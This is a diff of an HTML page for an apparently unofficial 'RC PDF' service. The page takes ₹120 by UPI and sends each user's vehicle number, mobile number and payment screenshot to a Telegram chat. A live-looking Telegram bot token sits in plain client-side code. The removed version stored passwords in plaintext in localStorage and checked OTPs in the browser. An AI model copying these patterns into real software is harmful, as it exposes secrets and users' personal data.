@@ -1,220 +1,297 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head/>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>RC PDF Portal</title>
 
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6160012759159835"
+     crossorigin="anonymous"></script>
 
 <style>
 body{
-margin:0;font-family:Arial;
+margin:0;
+font-family:Arial;
 background:linear-gradient(270deg,red,blue,green,purple,cyan);
 background-size:600% 600%;
 animation:bg 12s infinite alternate;
-display:flex;justify-content:center;align-items:center;min-height:100vh;
+display:flex;
+flex-direction:column;
+align-items:center;
+justify-content:center;
+min-height:100vh;
 }
-@keyframes bg{0%{background-position:0%}100%{background-position:100%}}
 
-.card{background:#000c;color:white;padding:25px;border-radius:18px;width:92%;max-width:420px;text-align:center}
-input,button{width:100%;padding:12px;margin-top:10px;border:none;border-radius:10px;font-size:16px}
-button{background:#00ffd5;font-weight:bold;cursor:pointer}
-.hidden{display:none}
-
-#authBox{position:fixed;inset:0;background:rgba(0,0,0,.88);display:flex;align-items:center;justify-content:center}
-.authCard{background:white;color:black;padding:28px;width:320px;border-radius:16px;text-align:center}
-.authLinks{display:flex;justify-content:space-between;font-size:14px;color:#0a58ca;cursor:pointer}
-
-#userBox{
-position:fixed;top:12px;right:12px;
-background:white;padding:6px 12px;border-radius:10px;
-display:none;text-align:center;font-weight:bold
+@keyframes bg{
+0%{background-position:0%}
+100%{background-position:100%}
 }
+
+.home{
+position:fixed;
+top:12px;
+left:12px;
+background:white;
+color:black;
+padding:8px 16px;
+border-radius:10px;
+font-weight:bold;
+cursor:pointer;
+z-index:999;
+}
+
+.card{
+background:#000c;
+color:white;
+padding:25px;
+border-radius:18px;
+width:92%;
+max-width:420px;
+text-align:center;
+}
+
+input,button{
+width:100%;
+padding:12px;
+margin-top:10px;
+border:none;
+border-radius:10px;
+font-size:16px;
+}
+
+button{
+background:#00ffd5;
+font-weight:bold;
+cursor:pointer;
+}
+
+.hidden{display:none;}
+
+img{
+width:220px;
+border-radius:14px;
+margin:12px 0;
+}
+
+.footer{
+margin-top:20px;
+padding:12px;
+width:92%;
+max-width:420px;
+text-align:center;
+color:white;
+font-size:14px;
+background:linear-gradient(270deg,red,blue,green,purple,cyan);
+background-size:600% 600%;
+animation:bg 10s infinite alternate;
+border-radius:12px;
+}
+
+.footer p{margin:4px 0;}
 </style>
 </head>
 
 <body>
 
-<!-- AUTH BOX -->
-<div id="authBox">
-<div class="authCard">
+<div class="home" onclick="goHome()">🏠 Home</div>
 
-<h3 id="authTitle">Login</h3>
-
-<input id="mobileField" placeholder="Mobile Number">
-<input id="emailField" placeholder="Email" class="hidden">
-<input id="passField" type="password" placeholder="Password">
-
-<button onclick="authAction()">Login</button>
-
-<div class="authLinks">
-<span onclick="switchSignup()">Signup</span>
-<span onclick="showForget()">Forget</span>
-</div>
-
-<!-- FORGET FLOW -->
-<div id="forgetBox" class="hidden">
-<input id="forgetEmail" placeholder="Registered Email">
-<button onclick="sendOTP()">Send OTP</button>
-
-<input id="otpInput" class="hidden" placeholder="Enter OTP">
-<button id="verifyBtn" class="hidden" onclick="verifyOTP()">Verify OTP</button>
-
-<input id="newPass" class="hidden" placeholder="New Password">
-<button id="saveBtn" class="hidden" onclick="saveNewPass()">Save Password</button>
-</div>
-
-<p id="authMsg"></p>
-</div>
-</div>
-
-<!-- USER -->
-<div id="userBox">
-<span id="profileText"></span><br>
-<button onclick="logout()" style="background:red;color:white;padding:6px 12px;border:none;border-radius:8px">
-Logout
-</button>
-</div>
-
-<!-- MAIN RC PORTAL -->
 <div class="card">
 
+<!-- PAGE 1 -->
 <div id="p1">
-<h3>🚗 Enter Vehicle Number</h3>
-<input id="vehicle" placeholder="BR-09-AB-1234">
+<h3>🚗 Enter Vehicle Number 🏍️</h3>
+<input id="vehicle" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatVehicle(this)">
 <button onclick="goPay()">Continue</button>
 </div>
 
+<!-- PAGE 2 -->
 <div id="p2" class="hidden">
 <h3>Pay ₹120</h3>
-<img width="220" src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi://pay?pa=bestinsurance@upi&pn=BestInsurance&am=120&cu=INR">
+
+<img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi%3A%2F%2Fpay%3Fpa%3Dbestinsurance%40upi%26pn%3DBestInsurance%26am%3D120%26cu%3DINR">
+<p>UPI ID: bestinsurance@upi</p>
+
+<a href="upi://pay?pa=bestinsurance@upi&pn=BestInsurance&am=120&cu=INR">
+<button>Pay with UPI App</button>
+</a>
+
 <input id="mobile" placeholder="Mobile Number">
-<input type="file" id="proof">
+
+<input type="file" id="proof" accept="image/*">
+
+
+
+
+
+
 <button onclick="submitPay()">Submit</button>
+
+
+
+
+
+
+
+  <p style="font-size:13px;opacity:0.9;margin-top:6px;">
+<b>Submit करने के बाद 15 सेकंड का इंतज़ार करें जब तक पेमेंट का सफल स्थिति ना दिखे 🛑</b>
+  </p>
 </div>
 
+<!-- PAGE 3 -->
 <div id="p3" class="hidden">
-<h3>Payment Successful</h3>
-<p>RC PDF will be sent soon</p>
+<h3>✅ Payment Successful</h3>
+<p>🎉Aapko jald hi aapka original RC ka PDF mil jayega🎊</p>
 </div>
 
+</div>
+
+<div class="footer">
+<p>© All Rights Reserved 2026</p>
+<p>Mishra SERVICE ♥️❣️</p>
+<p>MAKE IN INDIA</p>
+<p>MADE WITH ♥️</p>
 </div>
 
 <script>
-emailjs.init("eRTexjroiPjM9miek");
+const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
+const chatId="5600045707";
 
-let users = JSON.parse(localStorage.getItem("users")||"{}");
-let otpCode="", resetMobile="";
-
-function save(){localStorage.setItem("users",JSON.stringify(users))}
-
-/* SIGNUP MODE */
-function switchSignup(){
-authTitle.innerText="Signup";
-emailField.classList.remove("hidden");
+/* vibration helper */
+function vibrate(){
+if(navigator.vibrate) navigator.vibrate(40);
 }
 
-/* LOGIN & SIGNUP */
-function authAction(){
-let m=mobileField.value.trim();
-let e=emailField.value.trim();
-let p=passField.value.trim();
+/* vehicle format + vibration */
+function formatVehicle(el){
+vibrate();
 
-if(authTitle.innerText==="Signup"){
- if(!m||!e||!p) return authMsg.innerText="Fill all fields";
- if(users[m]) return authMsg.innerText="Already registered";
+let v = el.value.toUpperCase().replace(/[^A-Z0-9]/g,"");
 
- users[m]={email:e,password:p};
- save();
- authMsg.innerText="Signup successful. Login now.";
- authTitle.innerText="Login";
- emailField.classList.add("hidden");
- return;
+let p1=v.slice(0,2);
+let p2=v.slice(2,4);
+let p3=v.slice(4,6);
+let p4=v.slice(6,10);
+
+let out=p1;
+if(p2) out+="-"+p2;
+if(p3) out+="-"+p3;
+if(p4) out+="-"+p4;
+
+el.value=out;
 }
 
-if(!users[m]) return authMsg.innerText="User not found";
-if(users[m].password!==p) return authMsg.innerText="Wrong password";
-
-localStorage.setItem("loggedUser",m);
-showUser();
-authBox.style.display="none";
+/* navigation */
+function goHome(){
+p2.classList.add("hidden");
+p3.classList.add("hidden");
+p1.classList.remove("hidden");
 }
 
-/* SHOW USER */
-function showUser(){
-let m=localStorage.getItem("loggedUser");
-profileText.innerText="👤 "+m;
-userBox.style.display="block";
-}
-
-if(localStorage.getItem("loggedUser")){
-showUser();
-authBox.style.display="none";
-}
-
-/* FORGET PASSWORD (EMAIL OTP) */
-function showForget(){
-forgetBox.classList.remove("hidden");
-}
-
-function sendOTP(){
-let email=forgetEmail.value.trim();
-let found=false;
-
-for(let m in users){
- if(users[m].email===email){
-  found=true;
-  resetMobile=m;
- }
-}
-if(!found) return alert("Email not registered");
-
-otpCode=Math.floor(100000+Math.random()*900000)+"";
-
-emailjs.send(
- "service_h04mrbw",
- "template_g84p4hi",
- { email: email, passcode: otpCode }
-).then(()=>{
- alert("OTP sent successfully to email");
- otpInput.classList.remove("hidden");
- verifyBtn.classList.remove("hidden");
-},(err)=>{
- alert("Email error: "+err.text);
-});
-}
-
-function verifyOTP(){
-if(otpInput.value!==otpCode) return alert("Wrong OTP");
-
-newPass.classList.remove("hidden");
-saveBtn.classList.remove("hidden");
-}
-
-function saveNewPass(){
-users[resetMobile].password=newPass.value;
-save();
-alert("Password updated successfully");
-forgetBox.classList.add("hidden");
-}
-
-/* LOGOUT */
-function logout(){
-localStorage.removeItem("loggedUser");
-userBox.style.display="none";
-authBox.style.display="flex";
-}
-
-/* RC FLOW */
 function goPay(){
+if(!vehicle.value.trim()){
+alert("Vehicle number required");
+return;
+}
 p1.classList.add("hidden");
 p2.classList.remove("hidden");
 }
 
+/* submit & telegram */
 function submitPay(){
+
+let v=vehicle.value.trim();
+let m=mobile.value.trim();
+let p=proof.files[0];
+
+if(m.length<10){
+alert("Mobile number required");
+return;
+}
+
+if(!p){
+alert("Upload payment screenshot");
+return;
+}
+
+let data=new FormData();
+data.append("chat_id",chatId);
+data.append("caption",`🚗 RC REQUEST\nVehicle: ${v}\nMobile: ${m}`);
+data.append("photo",p);
+
+fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
+method:"POST",
+body:data
+})
+.then(()=>{
 p2.classList.add("hidden");
 p3.classList.remove("hidden");
+alert("Payment submitted successfully!");
+
+setTimeout(()=>{
+goHome();
+vehicle.value="";
+mobile.value="";
+proof.value="";
+},3000);
+})
+.catch(()=>{
+alert("Telegram send failed");
+});
+}
+</script>
+
+<style>
+.footer-links{
+ text-align:center;
+ padding:15px;
+ font-size:15px;
+}
+.footer-links button{
+ background:none;
+ border:none;
+ color:#0a58ca;
+ text-decoration:underline;
+ cursor:pointer;
+ margin:6px;
+ font-size:15px;
+}
+.footer-content{
+ display:none;
+ max-width:700px;
+ margin:12px auto;
+ font-size:14px;
+ line-height:1.6;
+}
+</style>
+
+<div class="footer-links">
+  <button onclick="toggle('about')">About</button>
+  <button onclick="toggle('privacy')">Privacy Policy</button>
+  <button onclick="toggle('contact')">Contact</button>
+</div>
+
+<div id="about" class="footer-content">
+<p>rcpdf.in is an online platform that provides vehicle-related information and digital tools, including RC details, insurance guidance, and document services.</p>
+<p>Our goal is to make vehicle information easy, fast, and accessible for everyone.</p>
+</div>
+
+<div id="privacy" class="footer-content">
+<p>We respect your privacy and do not collect personal information unless you choose to provide it.</p>
+<p>Third-party services such as Google AdSense may use cookies to display relevant advertisements.</p>
+<p>By using this website, you agree to our privacy policy.</p>
+</div>
+
+<div id="contact" class="footer-content">
+<p>For any vehicle-related queries or support, please contact us:</p>
+<p><strong>Email:</strong> br09insurance@gmail.com</p>
+<p><strong>Website:</strong> https://rcpdf.in</p>
+</div>
+
+<script>
+function toggle(id){
+ document.querySelectorAll('.footer-content').forEach(d=>d.style.display='none');
+ let el = document.getElementById(id);
+ el.style.display = (el.style.display === 'block') ? 'none' : 'block';
 }
 </script>
 
